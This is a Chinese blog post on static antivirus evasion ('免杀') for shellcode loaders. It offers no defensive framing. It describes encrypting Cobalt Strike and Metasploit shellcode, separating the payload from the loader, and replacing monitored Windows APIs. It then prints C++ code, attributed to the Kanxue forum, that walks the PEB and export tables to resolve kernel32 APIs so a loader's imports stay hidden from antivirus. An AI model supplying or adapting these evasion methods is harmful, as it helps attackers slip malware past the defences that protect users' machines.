---

layout: default

---



# 静态免杀

本文章还在不断完善中，如有错误或建议请不吝指教。

## 杀软查杀方式

其次在做免杀之前，我们必须得了解杀软具体是如何查杀我们的恶意软件的。了解了相应的查杀规则以及方式，我们才能更好的去针对性的绕过以及规避杀软的检测。

对于静态查杀来说，杀软主要识别的就是文件的特征码、敏感函数调用、以及特殊的操作（如循环异或）。因为暂时还没有对杀软查杀规则进行系统性的分析研究，大体的概念与方式都是来源于网上前人的总结。

## 针对性处理

个人认为免杀可以基于三个维度来做：

1. shellcode生成
2. shellcode传输
3. shellcode执行

我们可以针对每个维度来针对性的进行处理。首先就是shellcode的生成，现在流行的渗透框架CS、MSF以及一些知名远控生成的shellcode特征已经是被杀软盯得死死的了，如果不进行修改/加密/混淆等处理，基本就属于见光死，见面就得挨杀。

针对shellcode做处理有大体上有以下几种方式：

1. 直接修改shellcode字节码，加入无效指令/修改shellcode执行逻辑等来修改shellcode的特征码，这种方式属于超出我能力范围之外了，放弃。

2. 对shellcode进行加密混淆处理，常见的如XOR/base64/AES/DES等方式加密shellcode、按照一定规则插入无效字节、字符偏移表等。

   

其次shellcode的传输，也就是shellcode如何到达目标机器，比如直接在代码中硬编码后编译成单文件exe或者dll形式，通过网络协议获取远程shellcode、通过隐写术等方式写入其他文件等方式。相对来说通过网路协议传输或者额外文件中读取（也就是常说的分离免杀）会比单文件形式容易一点。因为上一步会对shellcode做相应的加密混淆等处理，这一步问题不大。

最后就是shellcode的执行了，一段shellcode想要在内存中执行的话需要完成以下步骤：

1. 创建/获取一段可读写执行的内存空间
2. 将shellcode写入这块内存空间
3. 将程序执行的流程指向这块内存空间

针对这3个步骤常见的通过windows API来执行如：

```c++
VirtualAlloc
MemeryCopy
CreateThread
```

以上3个API可以通过替换等效的其他API函数，比如VirtualAlloc 替换为HeapCreate/HeapAlloc，MemeryCopy替换为memcpy，CreateThread替换成指针等来组合使用。但是这种方式免杀效果一般，由于API基本已经被杀软监控的死死的了，我们可以通过动态调用的方式来调用API执行

```c++
LoadLibrary/GetProcAddress
GetModuleHandle/GetProcAddress
```

通过以上API组合可以实现动态获取相应的API来执行shellcode，但是由于还是调用了部分API，所以效果也不是很好。下面我们就可以通过动态获取相应dll的基址，来动态获取相应API的地址来调用相应的API：

```c++
//以下代码来自于看雪论坛 

DWORD _getKernelBase()
{
    DWORD dwPEB;
    DWORD dwLDR;
    DWORD dwInitList;
    DWORD dwDllBase;//当前地址
    PIMAGE_DOS_HEADER pImageDosHeader;//指向DOS头的指针
    PIMAGE_NT_HEADERS pImageNtHeaders;//指向NT头的指针
    DWORD dwVirtualAddress;//导出表偏移地址
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;//指向导出表的指针
    PTCHAR lpName;//指向dll名字的指针
    TCHAR szKernel32[] = TEXT("KERNEL32.dll");

    __asm
    {
        mov eax, FS: [0x30]//获取PEB所在地址
        mov dwPEB, eax
    }

    dwLDR = *(PDWORD)(dwPEB + 0xc);//获取PEB_LDR_DATA 结构指针
    dwInitList = *(PDWORD)(dwLDR + 0x1c);//获取InInitializationOrderModuleList 链表头
//第一个LDR_MODULE节点InInitializationOrderModuleList成员的指针

    for (;
        dwDllBase = *(PDWORD)(dwInitList + 8);//结构偏移0x8处存放模块基址
        dwInitList = *(PDWORD)dwInitList//结构偏移0处存放下一模块结构的指针
    )
    {
        pImageDosHeader = (PIMAGE_DOS_HEADER)dwDllBase;
        pImageNtHeaders = (PIMAGE_NT_HEADERS)(dwDllBase + pImageDosHeader->e_lfanew);
        dwVirtualAddress = pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress;//导出表偏移
        pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dwDllBase + dwVirtualAddress);//导出表地址
        lpName = (PTCHAR)(dwDllBase + pImageExportDirectory->Name);//dll名字

        if (strlen(lpName) == 0xc && !strcmp(lpName, szKernel32))//判断是否为“KERNEL32.dll”
        {
            return dwDllBase;
        }
    }
    return 0;
}

/*
获取指定字符串的API函数的调用地址
入口参数：_hModule为动态链接库的基址
_lpApi为API函数名的首址
出口参数：eax为函数在虚拟地址空间中的真实地址
*/

DWORD _getApi(DWORD _hModule, PTCHAR _lpApi)
{
    DWORD i;
    DWORD dwLen;
    PIMAGE_DOS_HEADER pImageDosHeader;//指向DOS头的指针
    PIMAGE_NT_HEADERS pImageNtHeaders;//指向NT头的指针
    DWORD dwVirtualAddress;//导出表偏移地址
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;//指向导出表的指针
    TCHAR** lpAddressOfNames;
    PWORD lpAddressOfNameOrdinals;//计算API字符串的长度
    for (i = 0; _lpApi[i]; ++i);
    dwLen = i;

    pImageDosHeader = (PIMAGE_DOS_HEADER)_hModule;
    pImageNtHeaders = (PIMAGE_NT_HEADERS)(_hModule + pImageDosHeader->e_lfanew);
    dwVirtualAddress = pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress;//导出表偏移
    pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(_hModule + dwVirtualAddress);//导出表地址
    lpAddressOfNames = (TCHAR**)(_hModule + pImageExportDirectory->AddressOfNames);//按名字导出函数列表
    for (i = 0; _hModule + lpAddressOfNames[i]; ++i)
    {
        if (strlen(_hModule + lpAddressOfNames[i]) == dwLen &&
!strcmp(_hModule + lpAddressOfNames[i], _lpApi))//判断是否为_lpApi
        {
            lpAddressOfNameOrdinals = (PWORD)(_hModule + pImageExportDirectory->AddressOfNameOrdinals);//按名字导出函数索引列表

            return _hModule + ((PDWORD)(_hModule + pImageExportDirectory->AddressOfFunctions))
[lpAddressOfNameOrdinals[i]];//根据函数索引找到函数地址

        }
    }
    return 0;
}
```

以上代码通过动态获取dll基址来动态调用API函数，免杀效果不错，这种方式还可以参考 《WindowsPE权威指南》的第11章动态加载技术。



## 参考链接

* [shellcode execution techniques](https://www.contextis.com/en/blog/a-beginners-guide-to-windows-shellcode-execution-techniques)
* 《WindowsPE权威指南》第11章

[back](../)